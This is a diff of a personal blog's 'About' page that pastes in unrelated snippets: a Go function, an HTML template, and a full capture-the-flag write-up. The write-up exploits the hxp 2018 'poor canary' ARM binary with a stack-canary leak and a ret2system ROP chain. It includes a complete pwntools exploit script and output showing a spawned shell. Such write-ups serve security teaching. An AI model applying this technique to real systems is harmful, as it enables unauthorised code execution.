@@ -3,7 +3,8 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
     <title>About | @dilag_Luc</title>
-    <meta name="description" content="About me  ">
+    <meta name="description" content="About me hsh
+func GetTitleFunc(style string) func(s string) string { switch strings.ToLower(style) { case &#34;go&#34;: return strings.Title case &#34;chicago&#34;: return transform.NewTitleConverter(transform.ChicagoStyle) default: return transform.NewTitleConverter(transform.APStyle) } } &lt;section id=&#34;main&#34;&gt; &lt;div&gt; &lt;h1 id=&#34;title&#34;&gt;{{ .Title }}&lt;/h1&gt; {{ range .Data.Pages }} {{ .Render &#34;summary&#34;}} {{ end }} &lt;/div&gt; &lt;/section&gt; # This exploit is based off of: https://ctftime.org/writeup/12568 from pwn import * target = process([&#39;qemu-arm&#39;, &#39;canary&#39;]) system = p32(0x16d90) binsh = p32(0x71eb0) # pop {r0, r4, pc} gadget = p32(0x26b7c) def clearInput(): print target. ">
     <link rel="canonical" href="https://testmara.github.io/about/" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.4/css/bulma.min.css">
     <link rel="stylesheet" href="/css/style.css" />
@@ -14,7 +15,8 @@
     <script src="/js/toggle.js"></script>
 
     <meta property="og:title" content="About" />
-<meta property="og:description" content="About me " />
+<meta property="og:description" content="About me hsh
+func GetTitleFunc(style string) func(s string) string { switch strings.ToLower(style) { case &#34;go&#34;: return strings.Title case &#34;chicago&#34;: return transform.NewTitleConverter(transform.ChicagoStyle) default: return transform.NewTitleConverter(transform.APStyle) } } &lt;section id=&#34;main&#34;&gt; &lt;div&gt; &lt;h1 id=&#34;title&#34;&gt;{{ .Title }}&lt;/h1&gt; {{ range .Data.Pages }} {{ .Render &#34;summary&#34;}} {{ end }} &lt;/div&gt; &lt;/section&gt; # This exploit is based off of: https://ctftime.org/writeup/12568 from pwn import * target = process([&#39;qemu-arm&#39;, &#39;canary&#39;]) system = p32(0x16d90) binsh = p32(0x71eb0) # pop {r0, r4, pc} gadget = p32(0x26b7c) def clearInput(): print target." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://testmara.github.io/about/" />
 <meta property="article:published_time" content="2022-06-28T02:56:42+01:00" />
@@ -22,7 +24,8 @@
 
     <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="About"/>
-<meta name="twitter:description" content="About me "/>
+<meta name="twitter:description" content="About me hsh
+func GetTitleFunc(style string) func(s string) string { switch strings.ToLower(style) { case &#34;go&#34;: return strings.Title case &#34;chicago&#34;: return transform.NewTitleConverter(transform.ChicagoStyle) default: return transform.NewTitleConverter(transform.APStyle) } } &lt;section id=&#34;main&#34;&gt; &lt;div&gt; &lt;h1 id=&#34;title&#34;&gt;{{ .Title }}&lt;/h1&gt; {{ range .Data.Pages }} {{ .Render &#34;summary&#34;}} {{ end }} &lt;/div&gt; &lt;/section&gt; # This exploit is based off of: https://ctftime.org/writeup/12568 from pwn import * target = process([&#39;qemu-arm&#39;, &#39;canary&#39;]) system = p32(0x16d90) binsh = p32(0x71eb0) # pop {r0, r4, pc} gadget = p32(0x26b7c) def clearInput(): print target."/>
 
     
     
@@ -41,7 +44,7 @@ if (!doNotTrack) {
 </head><body><header>
     
     
-        <section class="hero is-primary is-medium header-image" style="background-image: url('/images/blog/default.png');">
+        <section class="hero is-primary is-halfheight header-image" style="background-image: url('/images/blog/default.png');">
             
             
             
@@ -144,6 +147,228 @@ if (!doNotTrack) {
     <div class="container max-800px">
         <div class="content">
             <h2 id="about-me">About me</h2>
+<p>hsh</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">func <span style="color:#a6e22e">GetTitleFunc</span>(style string) func(s string) string {
+  <span style="color:#66d9ef">switch</span> strings.ToLower(style) {
+  <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;go&#34;</span><span style="color:#f92672">:</span>
+    <span style="color:#66d9ef">return</span> strings.Title
+  <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;chicago&#34;</span><span style="color:#f92672">:</span>
+    <span style="color:#66d9ef">return</span> transform.NewTitleConverter(transform.ChicagoStyle)
+  <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+    <span style="color:#66d9ef">return</span> transform.NewTitleConverter(transform.APStyle)
+  }
+}</code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">section</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;main&#34;</span>&gt;
+  &lt;<span style="color:#f92672">div</span>&gt;
+    &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;title&#34;</span>&gt;{{ .Title }}&lt;/<span style="color:#f92672">h1</span>&gt;
+    {{ range .Data.Pages }}
+      {{ .Render &#34;summary&#34;}}
+    {{ end }}
+  &lt;/<span style="color:#f92672">div</span>&gt;
+&lt;/<span style="color:#f92672">section</span>&gt;</code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># This exploit is based off of: https://ctftime.org/writeup/12568</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+target <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#39;qemu-arm&#39;</span>, <span style="color:#e6db74">&#39;canary&#39;</span>])
+
+system <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x16d90</span>)
+binsh <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x71eb0</span>)
+
+<span style="color:#75715e"># pop {r0, r4, pc}</span>
+gadget <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x26b7c</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">clearInput</span>():
+    <span style="color:#66d9ef">print</span> target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;&gt;&#39;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leakCanary</span>():
+    target<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">41</span>)
+    <span style="color:#66d9ef">print</span> target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;0&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">41</span>)
+    leak <span style="color:#f92672">=</span> target<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">3</span>)
+    canary <span style="color:#f92672">=</span> u32(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> leak)
+    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Stack canary: &#34;</span> <span style="color:#f92672">+</span> hex(canary)
+    <span style="color:#66d9ef">return</span> canary
+clearInput()
+
+canary <span style="color:#f92672">=</span> leakCanary()
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span>
+payload <span style="color:#f92672">+=</span> p32(canary)
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">12</span>
+payload <span style="color:#f92672">+=</span> gadget
+payload <span style="color:#f92672">+=</span> binsh
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;2&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>
+payload <span style="color:#f92672">+=</span> system
+
+target<span style="color:#f92672">.</span>sendline(payload)
+target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;&#34;</span>)
+
+target<span style="color:#f92672">.</span>interactive()</code></pre></div>
+<p>Example Output</p>
+<h1 id="hxp-2018-poor-canary">Hxp 2018 poor canary</h1>
+<p>Let&rsquo;s take a look at the binary:</p>
+<pre><code>$    file canary
+canary: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=3599326b9bf146191588a1e13fb3db905951de07, not stripped
+$    pwn checksec canary
+[*] '/Hackery/pod/modules/ret_2_system/hxp18_poorCanary/canary'
+    Arch:     arm-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x10000)
+</code></pre><p>So we can see that we are dealing with a <code>32</code> bit arm binary, that has a Stack Canary and NX stack. Arm is a different architecture from what we have been working with mostly, so things will be a bit different. Since we are dealing with arm binary, we will need qemu to run it (or some other emulator). In addition to that, if we want to use gdb we will need to install multi-architecture support for gdb. Lastly we will also need to install a utility for parsing through it&rsquo;s assembly code (we will use it later):</p>
+<p>To emulate the binary:</p>
+<pre><code>$    sudo apt-get install qemu-user
+</code></pre><p>For gdb support:</p>
+<pre><code>$    sudo apt-get install gdb-multiarch
+</code></pre><p>For assembly code viewing:</p>
+<pre><code>$    sudo apt-get install binutils-arm-none-eabi
+</code></pre><p>Now let&rsquo;s take a look at the binary:</p>
+<pre><code>$    qemu-arm canary
+Welcome to hxp's Echo Service!
+&gt; 15935728
+15935728
+&gt; 77777777777777777777777777777777777777777777777777777
+77777777777777777777777777777777777777777777777777777
+</code></pre><p>So we can see that it scan in data, and prints it back. Let&rsquo;s figure out exactly what it is doing.</p>
+<h2 id="reversing">Reversing</h2>
+<p>When we take a look at the main function in Ghidra, we see this:</p>
+<pre><code>undefined4 main(void)
+
+{
+  ssize_t bytesRead;
+  char input [41];
+  int stackCanary;
+  int canary;
+ 
+  canary = __stack_chk_guard;
+  setbuf((FILE *)stdout,(char *)0x0);
+  setbuf((FILE *)stdin,(char *)0x0);
+  puts(&quot;Welcome to hxp\'s Echo Service!&quot;);
+  while( true ) {
+    printf(&quot;&gt; &quot;);
+    bytesRead = read(0,input + 1,0x60);
+    if ((bytesRead &lt; 1) || ((input[bytesRead] == '\n' &amp;&amp; (input[bytesRead] = '\0', bytesRead == 1)))
+       ) break;
+    puts(input + 1);
+  }
+  if (canary == __stack_chk_guard) {
+    return 0;
+  }
+                    /* WARNING: Subroutine does not return */
+  __stack_chk_fail();
+}
+</code></pre><p>So we can see here that it starts off by printing the string <code>&quot;Welcome to hxp\'s Echo Service!&quot;</code>. Proceeding that it enters into a <code>while (true)</code> loop. Each iteration of the loop scans in <code>0x60</code> bytes worth of data into <code>input + 1</code>, which can only hold <code>40</code> bytes. So we have a buffer overflow. In addition to that it will print our input using <code>puts(input + 1)</code>.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>So to pop a shell, we will use the buffer overflow to overwrite the return address. However before we do that, we will need to deal with the stack canary.</p>
+<h4 id="canary">Canary</h4>
+<p>We will leak the stack canary using the <code>puts(input + 1)</code> call. This is how it will work. The function <code>puts</code> will print data from a pointer that it is passed until it reaches a null byte. We will write just enough data to overwrite the least significant byte of the stack canary. This is because the least significant byte of the stack canary will be a null byte. Then when it prints our input, it will also print the rest of the stack canary (which will just be <code>3</code> bytes since we are dealing with a <code>32</code> bit binary) since there will be no null bytes in between the start of our input and the rest of the stack canary. Then we can just take those three bytes and add a null byte as the least significant byte, and we will have the stack canary.</p>
+<h4 id="ret2system">Ret2System</h4>
+<p>So with that we will be able to overwrite the return address and get code execution. The only question is what will we execute with it. We can see that system is imported into the binary at <code>0x16d90</code>, so that is a good candidate:</p>
+<pre><code>                             **************************************************************
+                             *                          FUNCTION                          *
+                             **************************************************************
+                             int __stdcall system(char * __command)
+             int               r0:4           &lt;RETURN&gt;
+             char *            r0:4           __command
+                             __libc_system                                   XREF[1]:     Entry Point(*)  
+                             system
+        00016d90 00 00 50 e3     cmp        __command,#0x0
+</code></pre><p>We can also see it using objdump:</p>
+<pre><code>$    arm-none-eabi-objdump -D canary | grep libc_system
+00016d90 &lt;__libc_system&gt;:
+   16d94:    0a000000     beq    16d9c &lt;__libc_system+0xc&gt;
+</code></pre><p>Next we just need to prep the argument for the <code>system</code> function. In Ghidra we can see that the string <code>/bin/sh</code> is at <code>0x71eb0</code>:</p>
+<pre><code>                             s_/bin/sh_00071eb0                              XREF[1]:     do_system:00016d58(*)  
+        00071eb0 2f 62 69        ds         &quot;/bin/sh&quot;
+                 6e 2f 73
+                 68 00
+</code></pre><p>The next thing that we will need is a ROP gadget that will pop values into the <code>r0</code> and <code>pc</code> registers. The code will expect it&rsquo;s argument in <code>r0</code>, and it will expect <code>pc</code> to hold the address to be executed:</p>
+<pre><code>$    python ROPgadget.py --binary canary | grep pop | grep r0 | grep pc
+</code></pre><p>Looking through the list, we find this one which works (although we will need 4 bytes of filler data for <code>r4</code>):</p>
+<pre><code>0x00026b7c : pop {r0, r4, pc}
+</code></pre><p>There is just one last thing that we will need before we can write the exploit. We know that the offset between the start of our input and the stack canary is <code>40</code> bytes, but what is the offset between the stack canary and the return address? Looking at the stack layout of the <code>main</code> function, we see that the canary is stored at offset <code>-0x14</code>:</p>
+<pre><code>                             **************************************************************
+                             *                          FUNCTION                          *
+                             **************************************************************
+                             undefined main()
+             undefined         r0:1           &lt;RETURN&gt;                                XREF[1]:     00010530(W)  
+             ssize_t           r0:4           bytesRead                               XREF[1]:     00010530(W)  
+             int               Stack[-0x14]:4 stackCanary                             XREF[2]:     000104cc(W),
+                                                                                                   00010578(R)  
+             char[41]          Stack[-0x3d]   input
+             int               HASH:3fd2270   canary
+                             main                                            XREF[3]:     Entry Point(*),
+                                                                                          _start:0001039c(*), 000103b0(*)  
+        000104b8 30 40 2d e9     stmdb      sp!,{ r4 r5 lr }
+</code></pre><p>Since the canary is <code>4</code> bytes, that means that the end of the canary will put us at <code>0x10</code>. In <code>32</code> bit arm, the return address is stored at the base of the stack (we can just do a quick google search to find this out). Since addresses in this architecture are just 4 bytes, that means that return address ranges from offsets <code>0-4</code>. So the offset between the stack canary and the return address is just <code>0x10 - 0x4 = 0xc</code> bytes.</p>
+<p>So our exploit will contain the following:</p>
+<pre><code>*    40 bytes of filler data
+*    4 bytes stack canary
+*    12 bytes of filler data to return address
+*    4 byte rop gadget pop {r0, r4, pc}
+*    4 byte &quot;/bin/sh&quot; argument
+*    4 byte filler
+*    4 byte address of system
+</code></pre><h2 id="exploit">Exploit</h2>
+<p>Putting it all together we have the following exploit:</p>
+<pre><code># This exploit is based off of: https://ctftime.org/writeup/12568
+
+from pwn import *
+
+target = process(['qemu-arm', 'canary'])
+
+system = p32(0x16d90)
+binsh = p32(0x71eb0)
+
+# pop {r0, r4, pc}
+gadget = p32(0x26b7c)
+
+def clearInput():
+    print target.recvuntil('&gt;')
+
+def leakCanary():
+    target.send(&quot;0&quot;*41)
+    print target.recvuntil('0'*41)
+    leak = target.recv(3)
+    canary = u32(&quot;\x00&quot; + leak)
+    print &quot;Stack canary: &quot; + hex(canary)
+    return canary
+clearInput()
+
+canary = leakCanary()
+
+payload = &quot;&quot;
+payload += &quot;0&quot;*40
+payload += p32(canary)
+payload += &quot;1&quot;*12
+payload += gadget
+payload += binsh
+payload += &quot;2&quot;*4
+payload += system
+
+target.sendline(payload)
+target.sendline(&quot;&quot;)
+
+target.interactive()
+</code></pre><p>When we run it:</p>
+<pre><code>$    python exploit.py
+[+] Starting local process '/usr/bin/qemu-arm': pid 20280
+Welcome to hxp's Echo Service!
+&gt;
+ 00000000000000000000000000000000000000000
+Stack canary: 0x2c7cd100
+[*] Switching to interactive mode
+
+&gt; 0000000000000000000000000000000000000000
+&gt; $ w
+ 16:35:30 up  4:17,  1 user,  load average: 1.09, 1.18, 1.13
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+guyinatu :0       :0               12:19   ?xdm?  26:12   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
+$ ls
+canary    exploit.py  readme.md  ROPgadget.py
+</code></pre><p>Just like that, we popped a shell!</p>
 
         </div>
     </div>
